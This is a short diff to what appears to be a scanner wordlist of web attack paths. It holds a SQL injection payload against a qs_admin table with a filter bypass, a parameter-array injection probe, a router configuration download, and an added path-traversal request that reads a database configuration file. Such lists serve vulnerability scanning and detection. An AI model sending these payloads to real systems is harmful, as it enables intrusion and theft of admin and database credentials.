@@ -1,3 +1,4 @@
 /plus/ajax_common.php?act=hotword&query=%E9%8C%A6%27union+/*!50000SeLect*/+1,md5(123),3+from+qs_admin%23--
 /index.php?m=&c=AjaxPersonal&a=company_focus&company_id[0]=match&company_id[1][0]=test
 /cgi-bin/DownloadCfg/RouterCfm.cfg
+/index/download/index?name=index.php&url=../../application/database.php
